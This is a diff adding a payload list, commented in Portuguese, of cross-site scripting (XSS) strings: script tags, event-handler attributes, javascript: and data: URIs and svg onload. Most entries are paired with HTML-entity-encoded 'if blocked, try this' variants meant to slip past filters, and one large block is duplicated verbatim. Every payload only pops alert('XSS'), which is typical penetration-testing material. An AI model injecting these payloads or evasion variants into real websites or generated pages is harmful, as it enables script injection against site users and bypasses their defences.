@@ -1,0 +1,108 @@
+# XSS Refletido - Payload em Parâmetro de URL
+http://example.com/search?query=<script>alert('XSS')</script>
+
+# XSS Armazenado - Payload em um Comentário ou Postagem
+<script>alert('XSS')</script>
+
+# XSS em Eventos JavaScript
+<img src=x onerror=alert('XSS')>
+
+# XSS em Campos de Entrada de Formulário
+"><script>alert('XSS')</script>
+
+# XSS em Atributos OnClick
+<button onclick="alert('XSS')">Click me</button>
+# Payload usando eventos onMouseOver
+<a href="#" onmouseover="alert('XSS')">Mouse Over me</a>
+
+# Se barrado, tentar a seguinte opção:
+<a href="#" onmouseover="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;">Mouse Over me</a>
+
+# Payload usando a tag `data`
+<div data="<a href=javascript:alert('XSS')>Click me</a>"></div>
+
+# Se barrado, tentar a seguinte opção:
+<div data="&lt;a href=javascript:alert('XSS')&gt;Click me&lt;/a&gt;"></div>
+
+# Payload com comentários
+<a hre<!--<img src=x onerror=alert('XSS')>f="#">Mouse Over me</a>
+
+# Se barrado, tentar a seguinte opção:
+<a hre<!--&#x3C;img src=x onerror=alert('XSS')>f="#">Mouse Over me</a>
+
+# Payload usando JavaScript em um atributo estilo (style)
+<a style="background-image:url('javascript:alert('XSS')');">Mouse Over me</a>
+
+# Se barrado, tentar a seguinte opção:
+<a style="background-image:url('javascript:alert(\'XSS\')');">Mouse Over me</a>
+
+# Payload usando o evento onLoad em uma tag `svg`
+<svg/onload=alert('XSS')>
+
+# Se barrado, tentar a seguinte opção:
+<svg/onload=alert(&#x27;XSS&#x27;)>
+
+# Payload usando caracteres especiais para evasão
+<a hre&#x66;="#" onmouseover=&#x22;alert('XSS')">&#x4D;ouse Over me</a>
+
+# Se barrado, tentar a seguinte opção:
+<a hre<!--&#x3C;&#x69;&#x6D;&#x67; src=x onerror=alert('XSS')>f="#">Mouse Over me</a>
+# Payload usando eventos onMouseOver
+<a href="#" onmouseover="alert('XSS')">Mouse Over me</a>
+
+# Se barrado, tentar a seguinte opção:
+<a href="#" onmouseover="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;">Mouse Over me</a>
+
+# Payload usando a tag `data`
+<div data="<a href=javascript:alert('XSS')>Click me</a>"></div>
+
+# Se barrado, tentar a seguinte opção:
+<div data="&lt;a href=javascript:alert('XSS')&gt;Click me&lt;/a&gt;"></div>
+
+# Payload com comentários
+<a hre<!--<img src=x onerror=alert('XSS')>f="#">Mouse Over me</a>
+
+# Se barrado, tentar a seguinte opção:
+<a hre<!--&#x3C;img src=x onerror=alert('XSS')>f="#">Mouse Over me</a>
+
+# Payload usando JavaScript em um atributo estilo (style)
+<a style="background-image:url('javascript:alert('XSS')');">Mouse Over me</a>
+
+# Se barrado, tentar a seguinte opção:
+<a style="background-image:url('javascript:alert(\'XSS\')');">Mouse Over me</a>
+
+# Payload usando o evento onLoad em uma tag `svg`
+<svg/onload=alert('XSS')>
+
+# Se barrado, tentar a seguinte opção:
+<svg/onload=alert(&#x27;XSS&#x27;)>
+
+# Payload usando caracteres especiais para evasão
+<a hre&#x66;="#" onmouseover=&#x22;alert('XSS')">&#x4D;ouse Over me</a>
+
+# Se barrado, tentar a seguinte opção:
+<a hre<!--&#x3C;&#x69;&#x6D;&#x67; src=x onerror=alert('XSS')>f="#">Mouse Over me</a>
+
+# Payload usando o protocolo `javascript:` em um link
+<a href="javascript:alert('XSS')">Click me</a>
+
+# Se barrado, tentar a seguinte opção:
+<a href="javascript:alert(&#x27;XSS&#x27;)">Click me</a>
+
+# Payload usando o atributo `data:` em um link
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">Click me</a>
+
+# Se barrado, tentar a seguinte opção:
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">Click me</a>
+
+# Payload usando JavaScript em um atributo `src` de uma imagem
+<img src="javascript:alert('XSS');">
+
+# Se barrado, tentar a seguinte opção:
+<img src="javascript:alert(&#x27;XSS&#x27;);">
+
+# Payload usando o evento `onerror` para execução de código
+<img src="invalid-image" onerror="alert('XSS')">
+
+# Se barrado, tentar a seguinte opção:
+<img src="invalid-image" onerror="alert(&#x27;XSS&#x27;)">
